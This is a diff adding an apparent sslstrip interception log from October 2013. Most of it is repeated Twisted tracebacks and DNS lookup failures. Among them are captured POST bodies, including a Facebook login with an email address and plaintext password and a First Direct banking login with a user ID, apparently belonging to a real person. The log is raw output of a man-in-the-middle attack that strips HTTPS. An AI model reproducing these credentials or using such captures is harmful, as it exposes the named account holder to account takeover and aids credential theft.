@@ -1,0 +1,82 @@
+2013-10-25 16:27:12,548 Host resolution error: [Failure instance: Traceback: <type 'exceptions.ValueError'>: I/O operation on closed file
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/lib/python2.7/dist-packages/twisted/internet/base.py:250:_checkTimeout
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:362:callback
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:458:_startRunCallbacks
+--- <exception caught here> ---
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/local/lib/python2.7/dist-packages/sslstrip/ClientRequest.py:92:handleHostResolvedSuccess
+]
+2013-10-25 16:27:12,672 Host resolution error: [Failure instance: Traceback: <type 'exceptions.ValueError'>: I/O operation on closed file
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/lib/python2.7/dist-packages/twisted/internet/base.py:250:_checkTimeout
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:362:callback
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:458:_startRunCallbacks
+--- <exception caught here> ---
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/local/lib/python2.7/dist-packages/sslstrip/ClientRequest.py:92:handleHostResolvedSuccess
+]
+2013-10-25 16:27:12,673 Host resolution error: [Failure instance: Traceback: <type 'exceptions.ValueError'>: I/O operation on closed file
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/lib/python2.7/dist-packages/twisted/internet/base.py:250:_checkTimeout
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:362:callback
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:458:_startRunCallbacks
+--- <exception caught here> ---
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/local/lib/python2.7/dist-packages/sslstrip/ClientRequest.py:92:handleHostResolvedSuccess
+]
+2013-10-25 16:27:12,674 Host resolution error: [Failure instance: Traceback: <type 'exceptions.ValueError'>: I/O operation on closed file
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/lib/python2.7/dist-packages/twisted/internet/base.py:250:_checkTimeout
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:362:callback
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:458:_startRunCallbacks
+--- <exception caught here> ---
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/local/lib/python2.7/dist-packages/sslstrip/ClientRequest.py:92:handleHostResolvedSuccess
+]
+2013-10-25 16:27:12,675 Host resolution error: [Failure instance: Traceback: <type 'exceptions.ValueError'>: I/O operation on closed file
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/lib/python2.7/dist-packages/twisted/internet/base.py:250:_checkTimeout
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:362:callback
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:458:_startRunCallbacks
+--- <exception caught here> ---
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/local/lib/python2.7/dist-packages/sslstrip/ClientRequest.py:92:handleHostResolvedSuccess
+]
+2013-10-25 16:27:12,675 Host resolution error: [Failure instance: Traceback: <type 'exceptions.ValueError'>: I/O operation on closed file
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/lib/python2.7/dist-packages/twisted/internet/base.py:250:_checkTimeout
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:362:callback
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:458:_startRunCallbacks
+--- <exception caught here> ---
+/usr/lib/python2.7/dist-packages/twisted/internet/defer.py:545:_runCallbacks
+/usr/local/lib/python2.7/dist-packages/sslstrip/ClientRequest.py:92:handleHostResolvedSuccess
+]
+2013-10-25 16:27:22,662 Host resolution error: [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.DNSLookupError'>: DNS lookup failed: address 'images.apple.com' not found: [Errno -5] No address associated with hostname.
+]
+2013-10-25 16:28:16,839 Host resolution error: [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.DNSLookupError'>: DNS lookup failed: address 'fbstatic-a.akamaihd.net' not found: [Errno -5] No address associated with hostname.
+]
+2013-10-25 16:28:48,562 POST Data (safebrowsing.clients.google.com):
+goog-malware-shavar;a:120598-127828:s:115841-122811:mac
+goog-phish-shavar;a:298516-301337:s:146553-148908:mac
+
+2013-10-25 16:28:55,324 POST Data (safebrowsing.clients.google.com):
+goog-malware-shavar;a:120493-127800:s:117121-122792:mac
+goog-phish-shavar;a:298493-301304:s:146533-148885:mac
+
+2013-10-25 16:29:32,770 SECURE POST Data (www.facebook.com):
+lsd=AVqAaSHF&email=oliver%40oliverrees.co.uk&pass=cupcakes&default_persistent=0&timezone=&lgnrnd=082839_5qnp&lgnjs=n&locale=en_US
+2013-10-25 16:29:45,613 POST Data (safebrowsing.clients.google.com):
+goog-phish-shavar;a:298425-301103:s:146469-148729
+goog-malware-shavar;a:120201-127648:s:115201-122705
+
+2013-10-25 16:30:47,442 POST Data (www.facebook.com):
+__a=1&__dyn=7wiXwNAwhE&__req=1&__user=0&lsd=AVqAaSHF&ph=V3&q=%5B%7B%22user%22%3A%220%22%2C%22page_id%22%3A%22iu8dpx%22%2C%22posts%22%3A%5B%5B%22script_path_change%22%2C%7B%22source_path%22%3Anull%2C%22source_token%22%3Anull%2C%22dest_path%22%3A%22%2Findex.php%22%2C%22dest_token%22%3A%228faec450%22%2C%22navigation%22%3Anull%2C%22cause%22%3A%22load%22%7D%2C1382714896988%2C0%5D%5D%2C%22trigger%22%3A%22script_path_change%22%7D%5D&ts=1382715046773
+2013-10-25 16:32:06,008 Host resolution error: [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.DNSLookupError'>: DNS lookup failed: address 'www2.firstdirect.com' not found: [Errno -5] No address associated with hostname.
+]
+2013-10-25 16:32:44,759 POST Data (www.facebook.com):
+__a=1&__dyn=7wiXwNAwhE&__req=1&__user=0&lsd=AVqAaSHF&ph=V3&q=%5B%7B%22user%22%3A%220%22%2C%22page_id%22%3A%223sbnzo%22%2C%22posts%22%3A%5B%5B%22script_path_change%22%2C%7B%22source_path%22%3Anull%2C%22source_token%22%3Anull%2C%22dest_path%22%3A%22%2Findex.php%22%2C%22dest_token%22%3A%228faec450%22%2C%22navigation%22%3Anull%2C%22cause%22%3A%22load%22%7D%2C1382715015053%2C0%5D%5D%2C%22trigger%22%3A%22script_path_change%22%7D%5D&ts=1382715164566
+2013-10-25 16:33:17,896 POST Data (www2.firstdirect.com):
+__userPrefs=TF1%3B014%3B%3B%3B%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3B%252527undefined%252527%252520is%252520not%252520an%252520object%3BMozilla%3BNetscape%3B5.0%2520%2528Macintosh%253B%2520Intel%2520Mac%2520OS%2520X%252010_8_5%2529%2520AppleWebKit%2F536.30.1%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Version%2F6.0.5%2520Safari%2F536.30.1%3B20030107%3Bundefined%3Btrue%3B%3Btrue%3BMacIntel%3Bundefined%3BMozilla%2F5.0%2520%2528Macintosh%253B%2520Intel%2520Mac%2520OS%2520X%252010_8_5%2529%2520AppleWebKit%2F536.30.1%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Version%2F6.0.5%2520Safari%2F536.30.1%3Ben-us%3Biso-8859-1%3Bwww2.firstdirect.com%3Bundefined%3Bundefined%3Bundefined%3Bundefined%3Btrue%3Btrue%3B1382715197552%3B0%3B7%2520June%25202005%252021%253A33%253A44%2520BST%3B1440%3B900%3B%3B11.9%3B7.7.1%3B%3B%3B%3B4%3B0%3B-60%3B25%2520October%25202013%252016%253A33%253A17%2520BST%3B24%3B&webTrendsTag=register_login_to_service_centre&userid=ollyrees&cookieuserid=on&viewns_7_I0881101HGU0D0IN12V4RN0047_%3A_idJsp9ns_7_I0881101HGU0D0IN12V4RN0047__SUBMIT=1&jsf_sequence=1&viewns_7_I0881101HGU0D0IN12V4RN0047_%3A_idJsp9ns_7_I0881101HGU0D0IN12V4RN0047_%3A_idcl=submit
+2013-10-25 16:34:03,512 Host resolution error: [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.DNSLookupError'>: DNS lookup failed: address 'upload.wikimedia.org' not found: [Errno -5] No address associated with hostname.
+]
